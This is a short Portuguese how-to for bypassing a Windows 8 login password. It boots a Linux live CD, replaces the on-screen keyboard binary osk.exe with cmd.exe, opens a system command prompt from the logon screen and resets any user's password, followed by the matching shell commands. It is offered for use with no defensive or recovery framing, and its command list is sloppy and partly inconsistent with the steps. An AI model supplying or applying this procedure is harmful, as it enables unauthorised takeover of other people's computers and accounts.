Tutorial para quebrar senha do Windows 8

Iniciar a maquina pelo live cd do Linux;
Acessar a pasta Windows/system32 da instalcao do Windows 8;
Localizar o arquivo OSK.EXE e renomear para OSK.EXE.BKP;
Localizar o arquivo CMD.EXE e fazer uma copia do mesmo;
Renomear a copia do CMD.EXE para OSK.EXE;
Reinicie a maquina pelo HD;
Na tela de logon clique sobre o icone da central de facilidades ;
Selecione  Teclado Virtual e o prompt de comando abrir;
Digite o comando control userpasswords2 e tecle enter;
Escolha o usuï¿½rio que deseja quebrar a senha e clique em redefinir senha;
Cadastre uma nova senha ou deixe em branco;
Reinicie a maquina e seja feliz!

COMANDOS:

- fdisk -L
- mount /dev/sda2/ /mnt/
- cd /mnt
- Ls
- cd Windows/
- cd System32
- find cmd.exe
- find osk.exe
- cp cmd.exe osk.exe
- reboot
